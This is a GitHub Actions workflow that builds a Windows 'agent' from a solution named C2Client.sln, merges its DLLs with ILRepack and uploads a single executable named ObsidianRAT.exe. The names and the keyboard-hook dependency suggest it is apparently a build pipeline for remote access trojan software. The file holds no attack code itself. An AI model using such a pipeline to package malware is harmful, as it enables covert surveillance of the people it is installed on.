name: Build Windows Agent

on:
  push:
    branches: [ "main", "master" ]
    paths:
      - 'agent/**'
      - '.github/workflows/build-agent.yml'
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup MSBuild
        uses: microsoft/setup-msbuild@v2

      - name: Download NuGet CLI
        shell: pwsh
        run: |
          if (-not (Test-Path "nuget.exe")) {
            Invoke-WebRequest -Uri "https://dist.nuget.org/win-x86-commandline/latest/nuget.exe" -OutFile "nuget.exe"
          }
          Write-Host "nuget.exe ready"

      - name: Restore packages.config packages (Fody, AForge, etc.)
        shell: pwsh
        run: |
          .\nuget.exe install agent\packages.config -OutputDirectory packages -NonInteractive
          Write-Host "packages.config packages restored"

      - name: Restore PackageReference packages
        shell: pwsh
        working-directory: agent
        run: |
          ..\nuget.exe restore C2Client.sln -PackagesDirectory ..\packages -NonInteractive
          Write-Host "PackageReference packages restored"

      - name: Verify critical build dependencies
        shell: pwsh
        run: |
          $checks = @(
            "packages\Newtonsoft.Json.13.0.4\lib\net45\Newtonsoft.Json.dll",
            "packages\DeviceId.6.9.0\lib\net40\DeviceId.dll",
            "packages\MouseKeyHook.5.7.1\lib\net472\Gma.System.MouseKeyHook.dll"
          )
          $allOk = $true
          foreach ($path in $checks) {
            if (Test-Path $path) {
              Write-Host "OK: $path"
            } else {
              Write-Host "MISSING: $path"
              $allOk = $false
            }
          }
          if (-not $allOk) {
            Write-Host "Some packages missing, but continuing build..."
          }

      - name: Build Release
        shell: pwsh
        working-directory: agent
        run: |
          msbuild C2Client.sln `
            /p:Configuration=Release `
            /p:Platform="Any CPU" `
            /p:RestorePackages=false `
            /v:normal `
            /maxcpucount `
            /nologo
          if ($LASTEXITCODE -ne 0) {
            Write-Host "Build failed with exit code $LASTEXITCODE"
            exit $LASTEXITCODE
          }
          Write-Host "Build succeeded"

      - name: Merge DLLs with ILRepack
        shell: pwsh
        working-directory: agent
        run: |
          # Install ILRepack
          nuget install ILRepack -Version 2.0.34 -OutputDirectory packages

          $releaseDir = "bin\Release"
          $ilrepack = "packages\ILRepack.2.0.34\tools\ILRepack.exe"
          $mainExe = "$releaseDir\ObsidianRAT.exe"

          if (-not (Test-Path $mainExe)) {
            Write-Host "Main exe not found!"
            exit 1
          }

          # DLLs to exclude from merge (native or duplicate)
          $nativeExcludes = @("vpxmd.dll", "BouncyCastle.Crypto.dll")

          # Gather only .NET DLLs (exclude native ones)
          $allDlls = Get-ChildItem "$releaseDir\*.dll"
          $dlls = @()
          $nativeDlls = @()
          foreach ($dll in $allDlls) {
            if ($nativeExcludes -contains $dll.Name) {
              $nativeDlls += $dll.FullName
              Write-Host "Skipping native DLL: $($dll.Name)"
            } else {
              $dlls += $dll.FullName
            }
          }

          $dllCount = $dlls.Count
          Write-Host "Found $dllCount .NET DLLs to merge ($($nativeDlls.Count) native excluded)"

          if ($dllCount -eq 0) {
            Write-Host "No DLLs found, skipping ILRepack"
          } else {
            # Create temp dir for merged output
            $tempDir = "$releaseDir\temp_merge"
            New-Item -ItemType Directory -Force -Path $tempDir | Out-Null
            $tempExe = "$tempDir\ObsidianRAT.exe"

            # Run ILRepack — output keeps the same assembly name since filename matches
            & $ilrepack /out:$tempExe /target:exe /ndebug /allowdup $mainExe @dlls
            if ($LASTEXITCODE -ne 0) {
              Write-Host "ILRepack failed, uploading unmerged exe instead"
              Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue
            } else {
              # Replace original with merged
              Remove-Item $mainExe -Force
              # Remove merged .NET DLLs (keep native ones)
              $dlls | ForEach-Object { Remove-Item $_ -Force -ErrorAction SilentlyContinue }
              # Move merged exe back
              Move-Item $tempExe $mainExe -Force
              Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue
              Write-Host "ILRepack succeeded — single merged exe created"
            }
          }

      - name: List build output
        shell: pwsh
        run: |
          if (Test-Path "agent\bin\Release") {
            Get-ChildItem "agent\bin\Release" | Format-Table Name, Length -AutoSize
          } else {
            Write-Host "Release directory not found"
            exit 1
          }

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: agent-Release
          path: agent\bin\Release\ObsidianRAT.exe
          retention-days: 30
          if-no-files-found: error
